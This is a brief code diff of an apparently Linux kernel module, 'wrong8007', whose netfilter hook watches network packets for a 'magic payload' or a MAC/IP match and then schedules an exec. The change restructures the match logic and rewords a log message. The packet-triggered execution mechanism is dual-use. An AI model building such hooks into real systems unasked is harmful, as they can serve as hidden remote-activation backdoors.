@@ -296,10 +296,11 @@ static unsigned int nf_hook_fn(void *priv,
         }
 
         if (match_payload &&
-            payload_contains(skb, offset, payload_size, match_payload, payload_len)) {
-            wb_info("magic payload matched, scheduling exec\n");
-            wrong8007_activate();
-        }
+            !payload_contains(skb, offset, payload_size, match_payload, payload_len))
+            goto out;
+
+        wb_info("network trigger matched, scheduling exec\n");
+        wrong8007_activate();
 
     } else if (match_mac || match_ip) {
         /* Trigger on L2/L3 match alone */
